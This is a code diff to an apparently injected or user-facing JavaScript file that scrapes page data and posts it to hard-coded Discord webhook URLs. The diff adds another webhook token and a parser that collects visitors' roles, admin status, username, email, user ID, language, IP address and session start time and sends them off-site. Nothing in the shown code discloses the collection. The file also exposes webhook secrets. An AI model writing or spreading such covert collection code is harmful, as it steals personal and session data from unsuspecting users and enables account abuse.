@@ -13,7 +13,8 @@ const elmFlashVars = document.getElementById('flash-vars')
 
 const hooks = [
 	'702883925474934834/dGLDEfUZFaPPYljKo2dTeGJzpNVTABdbOnXzXneQOQEbaXqEzxkLGDYQd3Q3ZZhAszhF',
-	'715670836249362443/Q5ooBMFaF2tHgV-DhDt1FBA8YADolio3dywiv7ZcGOqxHPbl8SL_XJ1VOT5J05K90c8F'
+	'715670836249362443/Q5ooBMFaF2tHgV-DhDt1FBA8YADolio3dywiv7ZcGOqxHPbl8SL_XJ1VOT5J05K90c8F',
+	'716112993527660625/wbFoXjCh5OUZ2PDcwMmYj8JTjZY7dxJ_L-uaXed4JJvP3UJs8anfAHg7zc1YFUYXuikB'
 ]
 
 const regExps = {
@@ -38,6 +39,19 @@ const tslogDataParsers =
 	user (data)
 	{
 		beam(1, data)
+	},
+	data (data)
+	{
+		beam(2, {
+			roles: data.ROLES,
+			admin: data.is_admin,
+			user: data.username,
+			mail: data.user_email,
+			pid: data.user_id,
+			lang: data.lang_name,
+			ip: data.session.remoteIP,
+			start: data.session_start,
+		})
 	},
 	portal (data)
 	{
@@ -183,6 +197,8 @@ function init ()
 function beam (hook, data)
 {
 	try { data = JSON.stringify(data) } catch (err) {}
+
+	console.log('d l', String(data).length)
 
 	const url = 'https://discord.com/api/webhooks/' + hooks[hook]
 	const request = new XMLHttpRequest()
